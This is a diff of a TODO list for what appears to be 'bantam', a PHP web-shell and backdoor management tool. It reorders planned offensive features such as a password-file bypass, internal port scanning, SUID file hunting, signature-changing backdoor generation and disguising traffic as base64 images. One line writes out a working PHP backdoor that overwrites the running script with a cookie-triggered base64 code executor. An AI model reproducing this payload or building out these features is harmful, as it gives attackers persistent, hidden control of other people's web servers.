@@ -13,15 +13,13 @@
 * 4 - password feature?
 * 4 - Implement posix get posix_getpwuid function for linux getpasswd bypass, use a prompt to get use input for loop size
 * 3 - linux info, "cmd" - mount, && cat /etc/fstab && ls -la /etc/cron && ls -aRl /etc/cron* (writeable/we will display color green/red/grey etc when showing), 
-* 3 - CMD option to disable message boxes
 * 3 - Advanced options to edit code exectuin type to change from system to exec, etc (global)
 * 3 - bantam self / shell code editor, editing the bantam stored online - file_put_contents($_SERVER["SCRIPT_FILENAME"], '<?php if(isset($_COOKIE["sID"])) {$a=@create_function(null, @base64_decode($_COOKIE["sID"]));$a();}')
 * 2 - enum for the imagelist icons,  and enum for the returned data from file browser
 * 2 - add validity/testing checking to edit / add shell
-* 3 - Check site before add into clients, if its non existant or shell doesnt work, test with google.com etc
-* 3 - file browser tree view sorting, and show permissions
+* 2 - file browser show permissions
 * 3 - read file size limit check & mime check/show pictures in picture control
-* 3 - file upload / true downloader
+* 2 - true downloader
 * 2 - internal port scanner!!
 * 2 - find writeable files and folders?- https://github.com/epinna/weevely3/blob/master/modules/audit/filesystem.py
 * 2 - audit php configuration - https://github.com/epinna/weevely3/blob/master/modules/audit/phpconf.py
@@ -33,7 +31,6 @@
 * 1 - touch feature
 * 1 - passwd bypass
 * 1 - find suid/gid files !
-* 1 - fake response as b64 image
 * 1 - make row and col seperator random
 * 1 - encryption - should have option to send as stager or already be uploaded
 * 1 - proxy support credentials
@@ -46,6 +43,7 @@
 * 1 - max payload size
 * 10 - sort and parse filebrowser!
 
+* 3 - CMD option to disable message boxes
 * 1 - global cfg option to enable disable error suppression via @ to see more debug data
 * 3 - make disable error reporting a cfg/xml loaded var/ changable in the ("settings") to appernd error reporting onto every request, same for execution time?
 * ? - global cfg for Backdoor generator features to save "per server" to change the signatures, request vars, encrpytion, match encryption options etc
